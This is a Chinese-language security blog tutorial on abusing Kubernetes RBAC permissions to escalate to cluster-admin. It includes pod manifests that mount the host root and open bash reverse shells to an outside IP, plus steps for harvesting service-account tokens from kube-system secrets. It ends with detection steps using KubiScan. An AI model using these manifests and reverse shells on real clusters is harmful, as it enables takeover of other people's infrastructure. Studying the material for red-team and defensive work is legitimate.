<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4k-nW_9-P3YTJMbJa9UGLQ)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMlyicTzbpibjY16I0Chq2PALwwTN9NWBibQSRDsW8LKLokpicUFhdQMoqag/640?wx_fmt=png)

在上一篇文章中我们讲了 RBAC 授权，传送门：[K8s API 访问控制](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247491694&idx=1&sn=f9d15af93fc8e5b048a93ad23be86766&chksm=eaae6053ddd9e9457e65ecf3d66ff309beb89c782a9e6c717a46a0151dd3fb777df72a0a28d6&scene=21#wechat_redirect) 。并且绝大多数版本的 K8s 都默认使用 RBAC 作为其默认的授权方式。那么 RBAC 授权在我们进行 K8s 集群横向移动的时候有哪些可利用点呢？本篇文章我们介绍在 K8s 集群横向移动时如何滥用 RBAC 权限，并通过滥用的 RBAC 权限横向获得集群的 cluster-admin 权限接管整个 K8s 集群。

假如我们在 K8s 集群横向移动的时候，获得了一个 kubeconfig 文件或者获得了一个 Token，亦或者是获得了某台 pod 的权限。那么接下来我们的横向思路是什么呢？

在之前的文章中我们知道，一个 Pod 必须要以某一个 Service Account 的身份去运行，而一个 Service Account 对应着一个 Secret，一个 Secret 保存着一个 Token 和公钥文件。所以获得了 Pod 的权限就意味着获得了一个具有访问 K8s API Server 的 Service Account，只不过默认情况下该 Service Account 所拥有的权限比较低而已。而获得的 Token 最终也是可以转换到一个 Service Account 对象，该 Service Account 对象的权限取决于它所绑定的角色。而 kubeconfig 文件也是可以最终转换到对应的访问主体上 (User/Group)，该 kubeconfig 文件的权限取决于所对应的主体绑定的角色。

所以这个问题最后就归结到所获得的 kubeconfig 文件、Token、Pod 所对应的主体绑定的角色如何。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMk6kIjaXO5HcZR7EjbSk8F54Mic1Yyus3lBAltLgUOicYm7CDhlD3ibC2w/640?wx_fmt=png)

以下我们以获得了某个 Pod 权限为例作为演示，这也是实战中碰到最多的情况。

RBAC 权限滥用

首先，需要查看该 pod 对应的 Token 所拥有的权限，可以执行如下命令进行查看，查看其他的资源权限命令也一样。

```
#查看是否拥有 cluster-admin 的权限
kubectl auth can-i "*" "*" --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
#列出当前用户对所有服务器资源的访问权限
kubectl auth can-i --list --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
#列出当前用户对所有指定命名空间的访问权限
kubectl auth can-i --list --namespace=kube-system --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
#pod相关
kubectl auth can-i create pod --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
kubectl auth can-i list pod --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
kubectl auth can-i get pod --insecure-skip-tls-verify -s https://172.16.200.70:6443  --token="xxxx"
```

对于不同资源的权限，我们比较关注如下几个：

*   创建 pod 权限
    
*   查看 secret 权限
    
*   创建 Rolebinding/clusterrolebinding 权限
    

创建 POD 权限

创建 pod 权限对于攻击者来说是很重要的，如果攻击者拥有了创建 pod 权限，那么攻击者则可以在 master 节点创建特权容器挂载宿主机的目录，从而进行容器逃逸获得宿主机 master 节点的权限，从而接管整个 K8s 集群。

而创建 pod 权限也分为在整个 K8s 集群创建 pod 和在指定的命名空间下创建 pod。

春

指定命名空间

节

如下，创建一个具有创建 pod 权限的 role，名为 create-pod，作用的命名空间为 test。

```
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: test
  name: create-pod
rules:
- apiGroups: ["*"]
  resources: ["pods"]
  verbs: ["create","get"]
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMjN4wbibywfvTzZic59bibVx2lJP1lNSLkqia6AxCmicpxqnuxXgO9m2sDiaQ/640?wx_fmt=png)

注：要想能创建 pod，需要对 pods 拥有 get 和 create 权限。

然后再创建 ServiceAccount test-sa，并将 test-sa 与 create-pod 进行 rolebinding，作用的命名空间为 test。

```
#在test命名空间创建test-sa服务账户
kubectl create serviceaccount test-sa -n test
#将test-sa与create-pod进行rolebinding
kubectl create rolebinding test-sa-rolebinding -n test --role=create-pod --serviceaccount=test:test-sa
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMq5dl54ickqmEWKuia8pMK5GKpiaVAnZmQiciaPibCWE6icZcYUVfibqWJGibsBA/640?wx_fmt=png)

此时服务账户 test-sa 的 token 在 test 命名空间内就具有创建 pod 的权限了。执行如下命令查看服务账户 test-sa 所对应的 token。

```
#获得服务账户test-sa所对应的secret
kubectl get serviceaccounts test-sa -n test -o yaml
#查看指定secret的Token
kubectl describe secret test-sa-token-s4pgj -n test
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM2iaOGsBjgbzd9cZAVtIrVUd8b4K9ENwRz4Tkwh9N7JtbjtHITL6mrUg/640?wx_fmt=png)

假如我们现在获得了该 Token，并想利用该 Token 进行横向移动。

可以看到该 Token 在 test 命名空间下具有 create/get pod 的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMDWC0gXxNicCduw67pPib22lV6cicEmUe5jL88OGsicgSlpUnFRnsv5rPOA/640?wx_fmt=png)

拥有创建 pod 的权限我们一般的思路是创建一个挂载了宿主机根目录的 pod，然后再进入 pod 进行逃逸。如下我们在创建 pod 的时候指定命令来进行反弹 shell，并且挂载了宿主机的根目录到 / mnt 下，如下是创建 pod 的 yml 文件：

```
apiVersion: v1
kind: Pod
metadata:
  name: myapp2
  namespace: test
spec:
  containers:
  - image: nginx
    name: container
    command: ["bash"]
    args: ["-c", "bash -i >& /dev/tcp/172.16.200.60/4444 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
```

执行如下命令利用该 token 远程访问 API Server 并创建 pod。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM5mdBRPXbBcfneOdWoyaChg5bvuEgDueLxUgFicfohaCVEly8g8ocb4g/640?wx_fmt=png)

pod 创建完成后，可以看到接收到了目标 pod 的权限，并且挂载了宿主机的目录。然后就可以逃逸到宿主机了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMGA3OpNInXIwRR05scz7UcDh543ormW40pHhUnPE4r0xpzltXja81gA/640?wx_fmt=png)

注：我们可以直接在创建 pod 的 yml 文件中使用 spec.nodeName 指定 master 节点。逃逸成功后就直接获得了 master 节点的权限了。

春

集群角色

节

如下，创建一个具有创建 pod 权限的 clusterrole，名为 create-pod。

```
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: create-pod
rules:
- apiGroups: ["*"]
  resources: ["pods"]
  verbs: ["create","get"]
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMK1IRqX8sSLAibm7icIPcz3WGrmqiaLOsk4ASib0JoIK4gQHWs1sZ1V6c1w/640?wx_fmt=png)

然后再创建 ServiceAccount test-sa10，并将 test-sa10 与 create-pod 进行 clusterrolebinding。

```
#在test命名空间创建test-sa10服务账户
kubectl create serviceaccount test-sa10 -n test
#将test-sa10与create-pod进行clusterrolebinding
kubectl create clusterrolebinding test-sa10-clusterrolebinding --clusterrole=create-pod --serviceaccount=test:test-sa10
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMln0EvcjicuRbex3tNibTUePX9fJiaiazxMZysN2uibnN2m8enEEyIWSurKA/640?wx_fmt=png)

此时服务账户 test-sa10 的 token 在整个集群内就具有创建 pod 的权限了。执行如下命令查看服务账户 test-sa10 的 token。

```
#获得服务账户test-sa所对应的secret
kubectl get serviceaccounts test-sa10 -n test -o yaml
#查看指定secret的Token
kubectl describe secret test-sa10-token-4c8wm -n test
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMY0qzXxhDsXQynmbRTxWAz9Q0gfsZu8elnUccATQsOu0iavBQ82iaricnw/640?wx_fmt=png)

假如我们现在获得了该 Token，并想利用该 Token 进行横向移动。

我们接下来的思路是在创建 pod 的时候，手动指定高权限的 ServiceAccount namespace-controller 并指定命令来进行反弹 shell，如下是创建 pod 的 yml 文件：

```
apiVersion: v1
kind: Pod
metadata:
  name: myapp
  namespace: kube-system
spec:
  serviceAccountName: "namespace-controller"
  containers:
  - image: nginx
    name: container
    command: ["bash"]
    args: ["-c", "bash -i >& /dev/tcp/172.16.200.60/4444 0>&1"]
  volumes:
  - name: test
    hostPath:
      path: /
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMdgia5raxFwxkpN2zZ81f2xlTPkrZyW3s9zMg4UBUL8zhey43NuPosTw/640?wx_fmt=png)

等待 pod 创建完成，接收到 shell。由于这个 pod 绑定的服务账户是指定的 namespace-controller，因此具有这个服务账户所有的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMohUjibHNicNhohbfiba5QiaS3x3HHlnEbhNZCPpVS3bYwqEjvd9n84IEjg/640?wx_fmt=png)

服务账户 namespace-controller 所拥有的权限如下

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMA0KQynricOtWvcTuNTrT3OiaGxFibib9ia6wLjPH1cC6aX5IrSkrw8zS7yA/640?wx_fmt=png)

因此可以利用该 Token 做任何事，包括查看集群内所有的 secret。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM5tibtP3BGjXKy9Nia2njSvILhR197icINtbP3tPsI38K7m1aSUcz8BMWg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMOiaAJrJqkQxR0zQyMLnTQK8pYZiabWeKrHaWhskFtETxSlPRH3Wyfzcw/640?wx_fmt=png)

查看 secret 权限

查看 secret 权限需要对 secret 具有 list 和 get 权限。并且默认情况下，只有 kube-system 命名空间下的 secret 具有高权限。

春

list secret

节

拥有 list secret 的权限可以列举出集群中所有的 secret，但是不能读取 secret 所对应的 Token。

如下，创建一个具有 list secret 权限的 ClusterRole，名为 list-secret。

```
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: list-secret
rules:
- apiGroups: ["*"]
  resources: ["secrets"]
  verbs: ["list"]
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMSaKeTUibPYcjKnzYg9829XibwaXfRRbibicMkQnsvQv3QNZG6oPfDTzG6Q/640?wx_fmt=png)

然后再创建 ServiceAccount test-sa2，并将 test-sa2 与 list-secret 进行 clusterrolebinding。

```
#在test命名空间创建test-sa2服务账户
kubectl create serviceaccount test-sa2 -n test
#将test-sa2与list-secret进行clusterrolebinding
kubectl create clusterrolebinding test-sa2-clusterrolebinding --clusterrole=list-secret --serviceaccount=test:test-sa2
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMqrC905lDhXqUAX9cibfTjVyVnZpttCZ2oeoULsxfibEqMyULTZOm2libg/640?wx_fmt=png)

此时服务账户 test-sa2 的 token 就具有 list secret 的权限了。执行如下命令查看服务账户 test-sa2 所对应的 token。

```
#获得服务账户test-sa2所对应的secret
kubectl get serviceaccounts test-sa2 -n test -o yaml
#查看指定secret的Token
kubectl describe secret test-sa2-token-q588z -n test
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMQbgndeKmntje521dBzQnpibWBpOicicicK9ZVxmdWT1PVlQILejVhCU9Eg/640?wx_fmt=png)

假如我们现在获得了该 Token，并想利用该 Token 进行横向移动。查看该 token 所具有的权限，可以看到只有 list secret 的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM2uqUY5SNlI9R9iaW5VSYvY9N6OUErdejEhbphCPboOonTmhf1lywU5w/640?wx_fmt=png)

利用该 token 进行认证可以列出所有的 secrets。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMoFKkwlN8FeIU8gv1EVqicPSTIyVicWGicNCnjnLkdxpLf8PCKCCzyuCLg/640?wx_fmt=png)

但是想查看 secret 的具体信息的话还是没有权限，原因在于查看 secret 的具体信息需要 get secret 权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMCxsqWCkElxXDZYAAfOias20UgOic5aDpXnCfoHzZWlMmSyDH9ugZj9kg/640?wx_fmt=png)

春

get secret

节

拥有 get secert 的权限可以获得集群中指定的 secret 所对应的 Token。如下，创建一个具有 get secret 权限的 ClusterRole，名为 get-secret。

```
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: get-secret
rules:
- apiGroups: ["*"]
  resources: ["secrets"]
  verbs: ["get"]
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMwDrQmldduYwqzvucqzsu3fiaOkNbbqV8TbWoMd41WaXhiaFfFtDXTWqQ/640?wx_fmt=png)

然后再创建 ServiceAccount test-sa3，并将 test-sa3 与 get-secret 进行 clusterrolebinding。

```
#在test命名空间创建test-sa3服务账户
kubectl create serviceaccount test-sa3 -n test
#将test-sa3与get-secret进行clusterrolebinding
kubectl create clusterrolebinding test-sa3-clusterrolebinding --clusterrole=get-secret --serviceaccount=test:test-sa3
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMgG6DLz1cXFicPibZ3wZ2DERAU9KkBGMbpbNGqSjsssV34PLKzdcSicPpQ/640?wx_fmt=png)

此时服务账户 test-sa3 的 token 就具有 get secret 的权限了。执行如下命令查看服务账户 test-sa3 所对应的 token。

```
#获得服务账户test-sa3所对应的secret
kubectl get serviceaccounts test-sa3 -n test -o yaml
#查看指定secret的Token
kubectl describe secret test-sa3-token-k5tm4 -n test
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMVG4qqkShDbw0U4uC1oxMdibA9TreZ6kIGUARWHdQEcL7e7MnL1rcFqg/640?wx_fmt=png)

假如我们现在获得了该 Token，并想利用该 Token 进行横向移动。

查看该 token 所具有的权限，可以看到只有 get secret 的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMs7ctKxbv08BFiccdIZUAmlurd9hsmjL9IqN9VHeoaMFVSqRKw9j6IPA/640?wx_fmt=png)

具有 get secret 权限可以查看 secret 的具体信息，但是需要 secret 的具体名字。而获得 secret 的具体名字需要有 list secret 权限，如下图所示。当知道了 secret 的具体名字后即可查看对应 secret 的 token。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM43oLl4nVyQCkqFOeZ4vGIhnmmjB1U3OeXRa8nkqmNmB5RC6DGdRQPQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMR1IHsoozP5Y9evgEd4LtRlsvmialt0XyMNEfPfO2vKRMI2aQMW92GPw/640?wx_fmt=png)

因此，仅仅有 get secret 权限也是不够的，需要和 list secret 一起结合使用。

  

春

K8s 默认的高权限 secret

节

K8s 有如下 secret 默认是具有高权限的，只要获得了这些 secret 的 token，就可以进行提权。最后面的五个字符是随机生成的，并且拥有 27^5 种可能性，如下：

*   bootstrap-signer-token-xxxxx
    
*   daemon-set-controller-token-xxxxx
    
*   generic-garbage-collector-token-xxxxx
    
*   namespace-controller-token-xxxxx
    
*   replicaset-controller-token-xxxxx
    
*   resourcequota-controller-token-xxxxx
    
*   token-cleaner-token-xxxxx
    

  

我们以 bootstrap-signer-token-962js 为例，查看它的权限。该 secret 所对应的 ServiceAccount 为 bootstrap-signer

```
kubectl describe secret bootstrap-signer-token-962js -n kube-system
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMNiaIV8uY3ZdW004G0ibIST8ibqDIDib12pU3icyX9ZDmOxBTjAojxfqemcA/640?wx_fmt=png)

对 Token 进行 JWT 解码 https://jwt.io/#debugger 也可以看到

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMsvJib3NyqVOvdicjPJyP8HlibuFXtE8xNzVKCibsiaXdCbFcjUqeXxia1AAw/640?wx_fmt=png)

查看该 ServiceAccount 绑定的角色，可以看到绑定的角色为 Role/system:controller:bootstrap-signer。

```
kubectl get RoleBindings -o wide -A | grep bootstrap-signer
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMEX9M5PSylwSDQUnj1sMLYjDLIVNSkiaaD9pjOHVGxbat3HawdCyxEQg/640?wx_fmt=png)

最后查看该角色所对应的权限，可以看到所拥有的权限为对 secrets 具有 get、list、watch 的权限。

```
kubectl get Role/system:controller:bootstrap-signer -o yaml -n kube-system
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMcWO7icvk9tHdMicYRByMytcoYCS9ibpia4LlbiasSiahXqOmAquYvicLUf0nA/640?wx_fmt=png)

创建 rolebinding/clusterrolebinding 权限

如果攻击者拥有 rolebinding(作用在命名空间 kube-system) 或者 clusterrolebinding 权限，则攻击者可以将当前所控制的主体与高权限的 Role/clusterRole 进行绑定，从而进行提权。

如下，创建一个具有 create rolebinding 权限的 rRole，名为 create-rolebinding，作用在 kube-system 命名空间。

```
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: create-rolebinding
  namespace: kube-system
rules:
- apiGroups: ["*"]
  resources: ["rolebindings"]
  verbs: ["create"]
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMKB9jhS4DicXVZ0yv4yJQkeQtN9YVgcNIfK5XIibibS8WeodyMJ9ibb7hAw/640?wx_fmt=png)

然后在 kube-system 命名空间创建 ServiceAccount test-sa5，并将 test-sa5 与 create-rolebinding 进行 rolebinding。

```
#在test命名空间创建test-sa5服务账户
kubectl create serviceaccount test-sa5 -n kube-system
#将test-sa5与create-rolebinding进行rolebinding
kubectl create rolebinding test-sa5-rolebinding -n kube-system --role=create-rolebinding --serviceaccount=kube-system:test-sa5
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM1GEmq1zdRjeYmYsMktPa3wQaEx1PVPLLLaGAPFEv7qiaxnJxOVNEy8g/640?wx_fmt=png)

此时服务账户 test-sa5 的 token 就具有 create rolebinding 的权限了。执行如下命令查看服务账户 test-sa5 所对应的 token。

```
#获得服务账户test-sa5所对应的secret
kubectl get serviceaccounts test-sa5 -n kube-system -o yaml
#查看指定secret的Token
kubectl describe secret test-sa5-token-l455n -n kube-system
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMTpObCbIPJicqryOyicIEZNqamcRvw0eYpPkg4HKdVhs6vJN28mDSqmNQ/640?wx_fmt=png)

假如我们现在获得了该 Token，并想利用该 Token 进行横向移动。

此时我们就可以利用该 Token 给 kube-system 命名空间下的 test-sa5 进行 rolebinding，绑定的 role 为 system:controller:bootstrap-signer，该 role 默认对 kube-system 命名空间下的 secrets 进行 get、list、watch。但是当我们使用该 token 进行 rolebinding 的时候，提示如下错误。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMRnDLwFvXiblLph7gdebBKFGsYZc7L3uOIMiaRDzp3XoLOqoEibd5f9f1g/640?wx_fmt=png)

那么为什么会报错呢？

原因在于 RBAC API 会阻止用户通过编辑角色或者角色绑定来提升权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMnzqXRLeJERNFicgVkxq6vwChpU4MicyaFZhWUsHpVgKKBFTHLIK6BscQ/640?wx_fmt=png)

  

检测 RBAC 权限滥用

对于 K8s 集群管理员来说，可以利用下面的这款工具检测集群内的高危对象。

项目地址：

https://github.com/cyberark/KubiScan

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMNpuhEdcPb9kJLxRwHtg166NdxffVsJJXia6RIUc9cTAZLgYhDCZPVtQ/640?wx_fmt=png)

查找集群中所有高危的对象

执行如下命令查找集群中所有高危的对象，如所有高危的 Roles\ClusterRoles, RoleBindings\ClusterRoleBindings, users and pods\containers

```
kubiscan -a
```

  

查找具有高权限的 Role/ClusterRole

```
#查找具有高权限的Role
kubiscan -rr
#查找具有高权限的Role，并显示具有的规则
kubiscan -rr -r
#查找具有高权限的ClusterRole
kubiscan -rcr
#查找具有高权限的ClusterRole，并显示具有的规则
kubiscan -rcr -r

#查找具有高权限的Role和ClusterRole
kubiscan -rar
#查找具有高权限的Role和ClusterRole，并显示具有的规则
kubiscan -rar -r
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM474ciaUJyWibdnJwzc9QhmVmRPicyIWvEYCG2FUFGXKtzIia9xMHS9KW8w/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMvZ9TGDPy69LHr10HhyXRzvDSmpaObO8lhVy33rSsxejk4IibpQMibnMQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMLV6QHdH8xib6ibgdYkzCFAuaEOQZQ3ynAYPUBk00JoXp8Pdngn2BFX2w/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMZUqrhQn6krcrzPgzHWzqJ91vkS2T6xvLJed9LEpibIQflh1aTtZlerg/640?wx_fmt=png)

查找具有高权限的 Rolebindings/ClusterRolebindings

```
#查找具有高权限的Rolebindings
kubiscan -rb
#查找具有高权限的ClusterRolebindings
kubiscan -rcb
#查找具有高权限的Rolebindings和ClusterRolebindings
kubiscan -rab
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMAIojY1zibfHwJrJM2UmumIAR0Y4z4sFY98lgTxtv0iabialbiaykVP9Uyw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM0DZafkG6JgbxbTMUNIbmbU9Yh0KbuzPgM8OttYTLYQ7xePZXuJJyog/640?wx_fmt=png)

查询具有高权限的主体

```
kubiscan -rp
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMJGm7FUBw1I8iadsvt0icauo94pxzoYw1iaez5J20EGQwia3og6aXpqN1qw/640?wx_fmt=png)

查找关联了高权限 ServiceAccount 的 pod

```
kubiscan -rp
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMGmOpWrvXb1WUhjhoSbXNYPicE0f6q176CWMk515vl37mh8vJXibAd3iaQ/640?wx_fmt=png)

查找特权 pod

```
kubiscan -pp
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMTQX4ko4qyjGK2iaTVMat7HlbMJ3yW4Tj5cb1hSe6zGyOMk4nicBVgG6A/640?wx_fmt=png)

查找指定主体绑定的权限

春

指定命名空间下的 ServiceAccount 绑定的角色

节

执行如下命令查找 kube-system 命名空间下 daemon-set-controller 服务账户绑定的角色。

```
kubiscan -aars "daemon-set-controller" -ns "kube-system" -k "ServiceAccount"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickM7vicC1bfrALbZfJiaZIv37MiaEN5B7l3MBjibkwaNOyVIOD5kmymodrNjw/640?wx_fmt=png)

春

指定 User 绑定的角色

节

执行如下命令查找 system:kube-controller-manager 用户绑定的角色。

```
kubiscan -aars "system:kube-controller-manager" -k "User"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMwazyCwFicnUI4s7AeqQC3o48dLUTyONpu7ZmflKlvFHY45UTHWbKz9A/640?wx_fmt=png)

春

指定 Group 绑定的角色

节

执行如下命令查找 system:masters 组绑定的角色。

```
kubiscan -aars "system:masters" -k "Group"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMSb9OFEe9CGdTexPAjJ4j3dMoEJ7JjgoBfxSic4l1nSohjQXcbL8dLLA/640?wx_fmt=png)

查找指定主体的绑定

  

春

指定命名空间下的 ServiceAccount 的绑定

节

```
kubiscan -aarbs "daemon-set-controller" -ns "kube-system" -k "ServiceAccount"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMMXqdHNheEfjMB4A9t7bB3Axjes0REUqDMdT0MibBllpy6bAHtYw9gug/640?wx_fmt=png)

春

指定 User 的绑定

节

执行如下命令查找 system:kube-controller-manager 用户的绑定。

```
kubiscan -aarbs "system:kube-controller-manager" -k "User"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMWVDfQSdMicYF73vul37BPlVwBx2tibwyDtSlqrzsY617cyHce1RmcHtg/640?wx_fmt=png)

春

指定 Group 的绑定

节

执行如下命令查找 system:masters 组的绑定。

```
kubiscan -aarbs "system:masters" -k "Group"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMKknOVQ2yxfxuyriaxAicc6RvyENGLMJ2XIAtvEbSk8ekvzkIxZeAvHWQ/640?wx_fmt=png)

END

  

非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。    

如果你想一起学习内网渗透、域渗透、云安全、红队攻防的话，可以加入下面的知识星球一起学习交流。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2cjzGbfvRcBpOAWb2oGVickMQPzLAUqTwiaQdg8qOcQQvYhTvpAGDMW56mF2fV5jY2TREJuh43X0bXQ/640?wx_fmt=jpeg)

  

参考：

https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf